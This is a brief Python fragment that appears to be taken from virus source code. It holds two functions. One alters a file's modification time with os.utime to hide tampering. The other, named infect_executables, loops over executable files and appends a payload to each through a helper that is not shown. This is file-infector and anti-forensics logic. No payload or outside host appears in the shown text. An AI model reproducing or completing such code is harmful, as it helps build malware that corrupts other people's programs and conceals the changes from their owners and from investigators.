def modify_file_metadata(filepath):
    try:
        atime = time.time()
        mtime = atime - 100000  # Arbitrarily modify the modification time
        os.utime(filepath, (atime, mtime))
    except Exception as e:
        log(f"Error modifying file metadata: {e}")

def infect_executables(executable_files):
    for filepath in executable_files:
        append_payload_to_file(filepath)
